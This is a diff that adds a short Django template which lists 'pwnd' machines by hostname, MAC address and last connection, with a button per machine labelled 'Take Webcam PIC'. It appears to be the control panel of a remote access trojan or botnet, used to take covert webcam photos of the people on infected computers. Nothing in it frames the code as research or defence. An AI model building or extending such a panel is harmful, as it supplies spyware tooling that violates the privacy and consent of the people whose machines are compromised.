@@ -1,0 +1,17 @@
+{% for pwnd in pwnds %}
+<div>
+    {{pwnd.hostname}}               {{pwnd.mac_address}}
+</div>
+<div>
+    {{pwnd.latest_connection}}
+</div>
+<div>
+    ----------------------------------------
+</div>
+<form action="" method="POST">
+    {% csrf_token %}
+    <input type="hidden" name="id" value="{{pwnd.id}}">
+    <input type="submit" name="webcam" value="Take Webcam PIC">
+</form>
+
+{% endfor %}
